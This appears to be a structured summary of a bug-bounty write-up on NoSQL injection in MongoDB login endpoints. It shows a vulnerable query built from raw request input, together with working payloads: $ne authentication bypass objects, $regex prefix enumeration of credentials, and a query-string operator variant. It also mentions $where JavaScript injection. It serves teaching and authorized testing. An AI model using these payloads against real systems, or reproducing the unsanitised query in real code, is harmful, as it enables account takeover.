---
id: b19aaeeed20a
title: "NoSQL Injection: The Vulnerability Hiding in Your \"Modern\" Database"
source_url: https://riteshthorve.medium.com/nosql-injection-the-vulnerability-hiding-in-your-modern-database-6af6064c54f8
author: "Ritesh Thorve"
publication_date: 2026-08-11
category: injection
category_label: "Injection (SQL / NoSQL)"
content_type: vuln_writeup
steps_source: extracted
tags:
  - "mongodb"
  - "cybersecurity"
  - "bug-bounty"
  - "web-development"
  - "nosql-injection"
tools:
  []
quick_test: "Test for NoSQL injection by sending JSON objects or arrays in fields that expect strings, especially in authentication endpoints."
---

## Use case

The application allows users to log in using a username and password, but fails to properly validate the input, leading to NoSQL injection vulnerabilities that can bypass authentication checks.

## Steps to test

1. Identify the login endpoint of the application.
2. Send a login request with a username and a password that is a JSON object, e.g., { 'username': 'test', 'password': { '$ne': '' } }.
3. Observe if the login is successful despite the invalid password format.
4. Test with other NoSQL operators like $regex or $gt in the username or password fields.
5. Check for differences in application behavior or response times to identify potential blind NoSQL injection.
6. Attempt to inject JavaScript execution commands if the database supports it, e.g., using $where.

## Commands

```text
const user = await db.collection('users').findOne({ username: req.body.username, password: req.body.password });
{ 'username': 'dada', 'password': { '$ne': '' } }
{ 'username': { '$regex': '^adm' }, 'password': { '$ne': '' } }
{ 'password': { '$regex': '^a' } }
GET /login?username=dada&password[$ne]=
{
"username": "dada",
"password": "mypassword123"
}
{
"username": "dada",
"password": { "$ne": "" }
}
{ "username": { "$regex": "^adm" }, "password": { "$ne": "" } }
{ "password": { "$regex": "^a" } }
```

## Source

- Author: Ritesh Thorve
- Writeup: https://riteshthorve.medium.com/nosql-injection-the-vulnerability-hiding-in-your-modern-database-6af6064c54f8

_For authorized testing only. Credit the original author._
